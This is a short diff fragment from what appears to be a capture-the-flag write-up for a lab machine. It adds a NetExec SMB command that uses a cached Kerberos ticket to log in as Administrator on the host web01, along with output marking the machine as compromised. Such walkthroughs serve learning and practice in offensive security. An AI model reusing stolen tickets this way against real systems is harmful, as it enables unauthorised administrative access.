@@ -554,6 +554,12 @@ I now have a ticket for the `web01$` administrator
 # Administrator on `web01`
 
 ```python
-
+faketime -f +7h nxc smb web01.pirate.htb -u Administrator --use-kcache
+SMB         web01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
+SMB         web01.pirate.htb 445    WEB01            [+] pirate.htb\Administrator from ccache (Pwn3d!)
 ```
+
+I am now the administrator on the `web01` machine
+
+
 
